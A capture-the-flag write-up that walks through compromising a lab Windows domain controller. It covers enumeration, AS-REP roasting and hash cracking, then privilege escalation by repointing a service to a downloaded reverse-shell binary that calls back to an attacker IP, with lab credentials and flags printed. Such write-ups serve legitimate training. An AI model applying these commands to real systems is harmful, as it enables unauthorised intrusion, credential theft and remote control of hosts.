# Task 1 Get the user and root flag

Meet the team!

Whenever you are ready, click on the **Start Machine** button to fire up the Virtual Machine. Please allow 3-5 minutes for the VM to fully start.

### What is the user flag?

Start with nmap
`nmap -sS -Pn -p- -T4 -vv 10.10.37.18`

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 125
80/tcp    open  http             syn-ack ttl 125
88/tcp    open  kerberos-sec     syn-ack ttl 125
135/tcp   open  msrpc            syn-ack ttl 125
139/tcp   open  netbios-ssn      syn-ack ttl 125
389/tcp   open  ldap             syn-ack ttl 125
445/tcp   open  microsoft-ds     syn-ack ttl 125
464/tcp   open  kpasswd5         syn-ack ttl 125
593/tcp   open  http-rpc-epmap   syn-ack ttl 125
636/tcp   open  ldapssl          syn-ack ttl 125
3268/tcp  open  globalcatLDAP    syn-ack ttl 125
3269/tcp  open  globalcatLDAPssl syn-ack ttl 125
3389/tcp  open  ms-wbt-server    syn-ack ttl 125
5985/tcp  open  wsman            syn-ack ttl 125
7680/tcp  open  pando-pub        syn-ack ttl 125
9389/tcp  open  adws             syn-ack ttl 125
47001/tcp open  winrm            syn-ack ttl 125
49664/tcp open  unknown          syn-ack ttl 125
49665/tcp open  unknown          syn-ack ttl 125
49666/tcp open  unknown          syn-ack ttl 125
49667/tcp open  unknown          syn-ack ttl 125
49669/tcp open  unknown          syn-ack ttl 125
49670/tcp open  unknown          syn-ack ttl 125
49671/tcp open  unknown          syn-ack ttl 125
49673/tcp open  unknown          syn-ack ttl 125
49674/tcp open  unknown          syn-ack ttl 125
49677/tcp open  unknown          syn-ack ttl 125
49694/tcp open  unknown          syn-ack ttl 125
49702/tcp open  unknown          syn-ack ttl 125
52459/tcp open  unknown          syn-ack ttl 125
```

Lets get some more details
`nmap -sS -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,7680,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49674,49677,49694,49702,52459 -sC -sV --osscan-guess -T4 -vv 10.10.128.233`

```
PORT      STATE  SERVICE       REASON          VERSION
53/tcp    open   domain        syn-ack ttl 125 Simple DNS Plus
80/tcp    open   http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-title: Above Services
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open   kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2023-11-01 08:39:16Z)
135/tcp   open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open   ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds? syn-ack ttl 125
464/tcp   open   kpasswd5?     syn-ack ttl 125
593/tcp   open   ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped    syn-ack ttl 125
3268/tcp  open   ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped    syn-ack ttl 125
3389/tcp  open   ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-01T08:40:09+00:00
|_ssl-date: 2023-11-01T08:40:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Issuer: commonName=WIN-SERVICES.services.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-31T08:20:09
| Not valid after:  2024-05-01T08:20:09
| MD5:   a7ab:ede0:a615:3cd8:91f2:1d10:3596:9bc5
| SHA-1: 4735:96d8:21be:6cbe:bf82:b9c8:5e98:b2bf:413a:675a
| -----BEGIN CERTIFICATE-----
| MIIC+jCCAeKgAwIBAgIQbHMqKIwJi7VPsIYsy0kpxTANBgkqhkiG9w0BAQsFADAm
| MSQwIgYDVQQDExtXSU4tU0VSVklDRVMuc2VydmljZXMubG9jYWwwHhcNMjMxMDMx
| MDgyMDA5WhcNMjQwNTAxMDgyMDA5WjAmMSQwIgYDVQQDExtXSU4tU0VSVklDRVMu
| c2VydmljZXMubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0
| fY9OJIkuwMAkq5epqWabY3daN3mN7VQiIiN3VHOUcJ8xVnv920in0Ki5dEPKyZyE
| jelxq02lFoqFdwqoEufU5yyOuopZ6eaDEmGSq/Eh7RRaInrJUoLN0vz+kzTSaCra
| oHge9RdylNotWipwmZU0PTkxo1y0Kvesuti9QKsqTh/WNjCmLatRdGYgA5cNLl0/
| 2chZp8ugnSz7zBbch8XUjiLa8ljtxoPfg8NWFbT0ZF1/CDdp81Sc+VrXtzMovXZf
| OnfmXO+CBmqC0ClWxxeHYnqJSFVVakbbqP6bCvwtO68HDaVGbcuxbdzozrYc64zQ
| AI7R9Wnf8VJ0ahKbDzBpAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsG
| A1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAlohtujjjlqe5T7+pCkmupa4T
| jGMTasrGYUgA3MNDgJyzqW+pEXfq8yzqWJfES4mkj8Mfkq7GHEQIIyBOiTRsdJTm
| +y2FLJ6uijkx03MAzdpWxxd7sXrXEYXeusEy2mS/lzMb9Rt3EmKwr9OFmB9JgJ0M
| PjF0ywXjTLQBQFvTL38ZEQ4UFOoSuCX/khAotD9OA88PRGD+A+SmX9L3yrN8yGeB
| BZbLvlWBv9XbIKAMhU2AZlakIvVKEVkI3OFgprJajAalKD8zdWPB1XTNraOdJKZs
| sHftyvEeE1/j5DBEPCVSsUzCOST8WaSmMpfdT1ffG9XAAZd0Ymm/9eRB1jvaCg==
|_-----END CERTIFICATE-----
5985/tcp  open   http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  closed pando-pub     reset ttl 125
9389/tcp  open   mc-nmf        syn-ack ttl 125 .NET Message Framing
47001/tcp open   http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open   ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49673/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49674/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49677/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49694/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
49702/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
52459/tcp open   msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-01T08:40:09
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13958/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 6318/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46869/udp): CLEAN (Failed to receive data)
|   Check 4 (port 19860/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

In a web browser we see the website, no robots.txt, no interesting comments in the source.

The about us `/about.html` shows us names of staff.  `Joanne Doe`, `Jack Rock`, `Will Masters`, `Jonny LaRusso` and some address details, a domain `services.local` and an email `j.doe@services.local`.  We can assume then that the usernames are first initial. last name.

Check the website for more detail
`gobuster dir --url 10.10.128.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

Enumerate it further
`enum4linux -a 10.10.128.233`

```
Domain Name: SERVICES
Domain Sid: S-1-5-21-1966530601-3185510712-10604624
```

Not much from that.


Lets try responder

`responder -I tun0 -v`

No responses

Ldap:
`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
`sudo dpkg-reconfigure -p low slapd` and select no, enter the `services.local`, `services`, `password`
Choose no to remove database and yes to move existing config
Create a file `olcSaslSecProps.ldif` to allow no security

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Use the ldif file to patch LDAP
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
Test

```shell-session
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

output
```shell-session
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

Dump traffic
`sudo tcpdump -SX -i $INTERFACENAME tcp port 389`

No responses

Get further info from DNS
`gobuster dns -d services.local -r 10.10.128.233 -t 40 -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt`

```
Found: gc._msdcs.services.local
Found: domaindnszones.services.local
Found: DomainDnsZones.services.local
Found: ForestDnsZones.services.local
Found: forestdnszones.services.local
```

enum4linux again

`enum4linux -a -u "" -p "" 10.10.128.233 && enum4linux -a -u "guest" -p "" 10.10.128.233` no interesting results


`nmap -n -sV --script "ldap* and not brute" -p 389 10.10.128.233`

```
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: services.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=services,DC=local
|       ldapServiceName: services.local:win-services$@SERVICES.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=services,DC=local
|       serverName: CN=WIN-SERVICES,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=services,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=services,DC=local
|       namingContexts: DC=services,DC=local
|       namingContexts: CN=Configuration,DC=services,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=services,DC=local
|       namingContexts: DC=DomainDnsZones,DC=services,DC=local
|       namingContexts: DC=ForestDnsZones,DC=services,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 24633
|       dsServiceName: CN=NTDS Settings,CN=WIN-SERVICES,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=services,DC=local
|       dnsHostName: WIN-SERVICES.services.local
|       defaultNamingContext: DC=services,DC=local
|       currentTime: 20231101094121.0Z
|_      configurationNamingContext: CN=Configuration,DC=services,DC=local
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Looking at asrep, create a users.txt file containing
```users.txt
J.Doe
J.Rock
W.Masters
J.LaRusso
```

Run `python ~/Desktop/impacket/examples/GetNPUsers.py services.local/ -outputfile asrep -format hashcat -usersfile users.txt`

```
[-] User J.Doe doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$J.Rock@SERVICES.LOCAL:e9b3ff2bff20889e3d006fbb87bee436$d561e8f2b2f80ad878dbbb7592597f3c2d75cea9e9db3fb65c115e0cdc8a8839ef20960db1c3f2ff801befac508855d96ed5679ec9c80e3956515090da7abb38b1e58ec1e10983a9c6331c6598edf28c12833d581c1d84786693df66c79a02a833f3b6df72917c14261aaafdc7650b9fc4ea5ef84ffe6dc074e1b59428c5430d2f5d90f1ecc8ebeaa79160995c680d786885a8d744dda93b5c502a07054102ad9c914de8e6d254b4d042db66df8fc74fb31044b178cd659ec2426625652eeb1ac24e3736545a88180421ffea136e62790a8194ae1bcf44041bf002ffa3f275b3f6824f579c391e7259280253e1780d3c
[-] User W.Masters doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User J.LaRusso doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Lets see if we can get lucky

`hashcat -a 0 -m 18200 asrep rockyou.txt`

Sure can
`Serviceworks1`

Try to RDP to server but fails to connect.

try enum4linux again with authentication
`enum4linux -a -u services.local\\j.rock -p Serviceworks1 10.10.128.233`

Try rpcclient with authentication
`rpcclient -U services.local/j.rock%Serviceworks1 10.10.128.233`
```
pcclient $> getusername
Account Name: j.rock, Authority Name: SERVICES

pcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)

rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000001
DOMAIN_PASSWORD_COMPLEX

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[j.rock] rid:[0x457]
user:[j.doe] rid:[0x458]
user:[w.masters] rid:[0x459]
user:[j.larusso] rid:[0x45a]

rpcclient $> getusrdompwinfo 0x1f4
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x1f5
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x1f6
    &info: struct samr_PwInfo
        min_password_length      : 0x0000 (0)
        password_properties      : 0x00000000 (0)
               0: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x457
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x458
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x459
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> getusrdompwinfo 0x45a
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000001 (1)
               1: DOMAIN_PASSWORD_COMPLEX  
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE

rpcclient $> netshareenumall
netname: ADMIN$
        remark: Remote Admin
        path:   C:\Windows
        password:       (null)
netname: C$
        remark: Default share
        path:   C:\
        password:       (null)
netname: IPC$
        remark: Remote IPC
        path:
        password:       (null)
netname: NETLOGON
        remark: Logon server share 
        path:   C:\Windows\SYSVOL\sysvol\services.local\SCRIPTS
        password:       (null)
netname: SYSVOL
        remark: Logon server share 
        path:   C:\Windows\SYSVOL\sysvol
        password:       (null)
```

Lets try straight SMB
`smbclient \\\\services.local\\c$ -U j.rock`
This connects
Navigate to `c:\users\j.rock\desktop` and get the user.txt

Answer: `THM{ASr3p_R0aSt1n6}`

### What is the Administrator flag?


use evil-winrm to connect
`evil-winrm -i 10.10.128.233 -p Serviceworks1 -u j.rock`

`whoami /all` we are server operator which allows some services

`services` to show them

Attacker machine
```shell
git clone https://github.com/izenynn/c-reverse-shell.git
cd c-reverse-shell
./change_client.sh 10.4.18.254 4444
make
python3 -m http.server
```

On target
```
mkdir c:\temp\
cd\temp
curl http://10.4.18.254:8000 --outfile reverse.exe
sc config cfn-hup binpath= c:\temp\reverse.exe
```

Run the listener on the attacker machine `nc -vnlp 4444` and start the service on the target `sc.exe start cfn-hup`



On the attackers machine we have the reverse shell as system

```
type c:\users\administrator\desktop\root.txt
THM{S3rv3r_0p3rat0rS}
```

Answer: `THM{S3rv3r_0p3rat0rS}`